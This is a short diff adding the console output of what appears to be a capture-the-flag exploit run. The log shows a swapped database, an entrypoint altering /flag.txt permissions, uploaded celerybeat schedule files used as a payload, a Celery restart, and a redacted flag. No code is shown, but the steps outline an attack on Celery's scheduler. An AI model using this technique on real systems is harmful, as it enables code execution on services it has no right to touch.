@@ -1,0 +1,10 @@
+[+] carrier lesson id = 1906314037
+[+] built replacement DB (20480 bytes)
+[+] database replaced
+[+] entrypoint: chown app:app /flag.txt
+[+] entrypoint: chmod 0000 /flag.txt
+[+] uploaded /data/celerybeat-schedule.dir: HTTP 303
+[+] uploaded /data/celerybeat-schedule.dat: HTTP 303
+[+] celery restarted, waiting for the scheduler to load the payload
+
+[FLAG] ctfcup{...}
